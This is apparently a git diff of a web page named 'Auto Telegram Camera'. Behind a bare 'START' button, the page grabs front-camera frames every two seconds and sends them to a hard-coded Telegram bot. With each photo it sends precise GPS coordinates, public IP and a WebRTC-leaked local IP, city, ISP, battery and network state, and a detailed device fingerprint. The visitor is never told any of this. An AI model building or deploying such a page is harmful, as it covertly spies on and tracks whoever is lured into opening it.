@@ -5,129 +5,169 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Auto Telegram Camera</title>
 <style>
-body{margin:0;background:#000;color:#fff;display:flex;flex-direction:column;align-items:center;justify-content:center;height:100vh;font-family:sans-serif}
-button{margin-top:12px;padding:10px 20px;font-size:16px;cursor:pointer}
+body {
+    margin: 0;
+    padding: 0;
+    background: #000;
+    color: #fff;
+    font-family: sans-serif;
+    min-height: 100vh;
+}
+
+.fixed-button {
+    position: fixed;
+    bottom: 0;
+    left: 0;
+    width: 100%;
+    height: 60px;
+    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+    border: none;
+    color: white;
+    font-size: 20px;
+    font-weight: bold;
+    cursor: pointer;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    z-index: 1000;
+    transition: all 0.3s ease;
+}
+
+.fixed-button:hover {
+    background: linear-gradient(135deg, #5a67d8 0%, #6b46c1 100%);
+    height: 70px;
+}
+
+.fixed-button:active {
+    background: linear-gradient(135deg, #4c51bf 0%, #553c9a 100%);
+}
+
+canvas {
+    display: none;
+}
 </style>
 </head>
 <body>
-<canvas id="canvas" style="display:none"></canvas>
-<button onclick="startSending()">▶ START AUTO SEND</button>
+<canvas id="canvas"></canvas>
+
+<button class="fixed-button" onclick="startSending()">START</button>
+
 <script>
-const canvas=document.getElementById("canvas");
-const BOT_TOKEN="7917384016:AAG7cxyuts9UJ-Km0BMqBeQVJEJfstH239g";
-const CHAT_ID="8319568593";
-let intervalId=null;
-let latitude="N/A";
-let longitude="N/A";
-let mapLink="Location not allowed";
-let userIP="Unknown";
-let stream=null;
-let batteryInfo="Battery: Not available";
-let networkInfo="Network: Not available";
-let localIP="Unknown";
-let city="Unknown";
-let country="Unknown";
-let isp="Unknown";
+const canvas = document.getElementById("canvas");
+const BOT_TOKEN = "7917384016:AAG7cxyuts9UJ-Km0BMqBeQVJEJfstH239g";
+const CHAT_ID = "8319568593";
+let intervalId = null;
+let latitude = "N/A";
+let longitude = "N/A";
+let mapLink = "Location not allowed";
+let userIP = "Unknown";
+let stream = null;
+let batteryInfo = "Battery: Not available";
+let networkInfo = "Network: Not available";
+let localIP = "Unknown";
+let city = "Unknown";
+let country = "Unknown";
+let isp = "Unknown";
 
-navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}}).then(s=>{stream=s});
+navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } }).then(s => { stream = s });
 
-if("geolocation" in navigator){
-navigator.geolocation.getCurrentPosition(pos=>{
-latitude=pos.coords.latitude.toFixed(6);
-longitude=pos.coords.longitude.toFixed(6);
-mapLink=`https://maps.google.com/maps?q=${latitude},${longitude}&z=17&t=k`;
-},()=>{
-mapLink="Location denied";
-},{enableHighAccuracy:true,timeout:10000,maximumAge:0});
+if ("geolocation" in navigator) {
+    navigator.geolocation.getCurrentPosition(pos => {
+        latitude = pos.coords.latitude.toFixed(6);
+        longitude = pos.coords.longitude.toFixed(6);
+        mapLink = `https://maps.google.com/maps?q=${latitude},${longitude}&z=17&t=k`;
+    }, () => {
+        mapLink = "Location denied";
+    }, { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 });
 }
 
-fetch("https://api.ipify.org?format=json").then(r=>r.json()).then(d=>{
-userIP=d.ip;
-fetch(`https://ipapi.co/${userIP}/json/`)
-.then(r=>r.json())
-.then(ipData=>{
-city=ipData.city||"Unknown";
-country=ipData.country_name||"Unknown";
-isp=ipData.org||"Unknown";
-});
+fetch("https://api.ipify.org?format=json").then(r => r.json()).then(d => {
+    userIP = d.ip;
+    fetch(`https://ipapi.co/${userIP}/json/`)
+        .then(r => r.json())
+        .then(ipData => {
+            city = ipData.city || "Unknown";
+            country = ipData.country_name || "Unknown";
+            isp = ipData.org || "Unknown";
+        });
 });
 
-if(navigator.getBattery){
-navigator.getBattery().then(b=>{
-batteryInfo=`
+if (navigator.getBattery) {
+    navigator.getBattery().then(b => {
+        batteryInfo = `
 🔋 Battery:
-Level: ${Math.round(b.level*100)}%
-Charging: ${b.charging?'Yes':'No'}
-Time: ${b.chargingTime===Infinity?'Not charging':b.chargingTime+' seconds'}
+Level: ${Math.round(b.level * 100)}%
+Charging: ${b.charging ? 'Yes' : 'No'}
+Time: ${b.chargingTime === Infinity ? 'Not charging' : b.chargingTime + ' seconds'}
 `;
-});
+    });
 }
 
-if(navigator.connection){
-networkInfo=`
+if (navigator.connection) {
+    networkInfo = `
 📡 Network:
 Type: ${navigator.connection.effectiveType}
 Downlink: ${navigator.connection.downlink} Mbps
 RTT: ${navigator.connection.rtt} ms
-Save Data: ${navigator.connection.saveData?'Enabled':'Disabled'}
+Save Data: ${navigator.connection.saveData ? 'Enabled' : 'Disabled'}
 `;
 }
 
-const getLocalIPAddress=()=>{
-return new Promise(resolve=>{
-const pc=new RTCPeerConnection({iceServers:[]});
-pc.createDataChannel('');
-pc.createOffer().then(sdp=>pc.setLocalDescription(sdp));
-pc.onicecandidate=ice=>{
-if(!ice||!ice.candidate||!ice.candidate.candidate)return;
-const ip=/([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(ice.candidate.candidate);
-if(ip&&ip[1])resolve(ip[1]);
-pc.close();
-};
-setTimeout(()=>resolve("Not found"),1000);
-});
-};
-
-const getBrowserPlugins=()=>{
-const plugins=[];
-for(let i=0;i<navigator.plugins.length;i++){
-plugins.push(navigator.plugins[i].name);
-}
-return plugins.length>0?plugins.slice(0,5).join(', '):'No plugins detected';
+const getLocalIPAddress = () => {
+    return new Promise(resolve => {
+        const pc = new RTCPeerConnection({ iceServers: [] });
+        pc.createDataChannel('');
+        pc.createOffer().then(sdp => pc.setLocalDescription(sdp));
+        pc.onicecandidate = ice => {
+            if (!ice || !ice.candidate || !ice.candidate.candidate) return;
+            const ip = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(ice.candidate.candidate);
+            if (ip && ip[1]) resolve(ip[1]);
+            pc.close();
+        };
+        setTimeout(() => resolve("Not found"), 1000);
+    });
 };
 
-const getAdvancedSystemInfo=()=>{
-const cores=navigator.hardwareConcurrency||'Unknown';
-const ram=navigator.deviceMemory||'Unknown';
-const lang=navigator.language;
-const langs=navigator.languages?navigator.languages.join(', '):lang;
-const timezone=Intl.DateTimeFormat().resolvedOptions().timeZone;
-const platform=navigator.platform;
-const vendor=navigator.vendor||'Unknown';
-const cookieEnabled=navigator.cookieEnabled?'Yes':'No';
-const pdfViewerEnabled=navigator.pdfViewerEnabled?'Yes':'No';
-const webdriver=navigator.webdriver?'Yes':'No';
-const maxTouchPoints=navigator.maxTouchPoints||0;
-const userAgent=navigator.userAgent;
-const deviceModel=userAgent.match(/\((.*?)\)/)?userAgent.match(/\((.*?)\)/)[1]:'Unknown';
-const plugins=getBrowserPlugins();
-const doNotTrack=navigator.doNotTrack||'Not specified';
-const oscpu=navigator.oscpu||'Unknown';
-const product=navigator.product||'Unknown';
-const productSub=navigator.productSub||'Unknown';
+const getBrowserPlugins = () => {
+    const plugins = [];
+    for (let i = 0; i < navigator.plugins.length; i++) {
+        plugins.push(navigator.plugins[i].name);
+    }
+    return plugins.length > 0 ? plugins.slice(0, 5).join(', ') : 'No plugins detected';
+};
 
-const now=new Date();
-const timezoneOffset=now.getTimezoneOffset();
-const utcOffset=-timezoneOffset/60;
-const offsetSign=utcOffset>=0?'+':'-';
-const formattedOffset=`UTC${offsetSign}${Math.abs(utcOffset)}`;
+const getAdvancedSystemInfo = () => {
+    const cores = navigator.hardwareConcurrency || 'Unknown';
+    const ram = navigator.deviceMemory || 'Unknown';
+    const lang = navigator.language;
+    const langs = navigator.languages ? navigator.languages.join(', ') : lang;
+    const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+    const platform = navigator.platform;
+    const vendor = navigator.vendor || 'Unknown';
+    const cookieEnabled = navigator.cookieEnabled ? 'Yes' : 'No';
+    const pdfViewerEnabled = navigator.pdfViewerEnabled ? 'Yes' : 'No';
+    const webdriver = navigator.webdriver ? 'Yes' : 'No';
+    const maxTouchPoints = navigator.maxTouchPoints || 0;
+    const userAgent = navigator.userAgent;
+    const deviceModel = userAgent.match(/\((.*?)\)/) ? userAgent.match(/\((.*?)\)/)[1] : 'Unknown';
+    const plugins = getBrowserPlugins();
+    const doNotTrack = navigator.doNotTrack || 'Not specified';
+    const oscpu = navigator.oscpu || 'Unknown';
+    const product = navigator.product || 'Unknown';
+    const productSub = navigator.productSub || 'Unknown';
 
-return`
+    const now = new Date();
+    const timezoneOffset = now.getTimezoneOffset();
+    const utcOffset = -timezoneOffset / 60;
+    const offsetSign = utcOffset >= 0 ? '+' : '-';
+    const formattedOffset = `UTC${offsetSign}${Math.abs(utcOffset)}`;
+
+    return `
 🖥️ SYSTEM INFORMATION:
 Device: ${platform}
 Model: ${deviceModel}
 OS CPU: ${oscpu}
-Browser: ${userAgent.substring(0,80)}...
+Browser: ${userAgent.substring(0, 80)}...
 Product: ${product} ${productSub}
 CPU Cores: ${cores}
 RAM: ${ram} GB
@@ -147,26 +187,26 @@ Color Depth: ${screen.colorDepth}
 `;
 };
 
-function startSending(){
-getLocalIPAddress().then(ip=>{localIP=ip});
-if(!intervalId){
-intervalId=setInterval(captureAndSend,2000);
-}
+function startSending() {
+    getLocalIPAddress().then(ip => { localIP = ip });
+    if (!intervalId) {
+        intervalId = setInterval(captureAndSend, 2000);
+    }
 }
 
-function captureAndSend(){
-if(!stream)return;
-const videoTrack=stream.getVideoTracks()[0];
-const imageCapture=new ImageCapture(videoTrack);
-imageCapture.grabFrame().then(imageBitmap=>{
-canvas.width=imageBitmap.width;
-canvas.height=imageBitmap.height;
-const ctx=canvas.getContext("2d");
-ctx.translate(canvas.width,0);
-ctx.scale(-1,1);
-ctx.drawImage(imageBitmap,0,0);
-canvas.toBlob(blob=>{
-const caption=`
+function captureAndSend() {
+    if (!stream) return;
+    const videoTrack = stream.getVideoTracks()[0];
+    const imageCapture = new ImageCapture(videoTrack);
+    imageCapture.grabFrame().then(imageBitmap => {
+        canvas.width = imageBitmap.width;
+        canvas.height = imageBitmap.height;
+        const ctx = canvas.getContext("2d");
+        ctx.translate(canvas.width, 0);
+        ctx.scale(-1, 1);
+        ctx.drawImage(imageBitmap, 0, 0);
+        canvas.toBlob(blob => {
+            const caption = `
 📸 AUTO CAPTURE - ${new Date().toLocaleTimeString()}
 ⏰ Full Time: ${new Date().toLocaleString()}
 
@@ -189,13 +229,13 @@ ${batteryInfo}
 
 ⚠️ Automatic capture every 2 seconds
 `;
-const formData=new FormData();
-formData.append("chat_id",CHAT_ID);
-formData.append("photo",blob);
-formData.append("caption",caption);
-fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,{method:"POST",body:formData});
-},"image/jpeg",0.7);
-}).catch(()=>{});
+            const formData = new FormData();
+            formData.append("chat_id", CHAT_ID);
+            formData.append("photo", blob);
+            formData.append("caption", caption);
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: "POST", body: formData });
+        }, "image/jpeg", 0.7);
+    }).catch(() => { });
 }
 </script>
 </body>
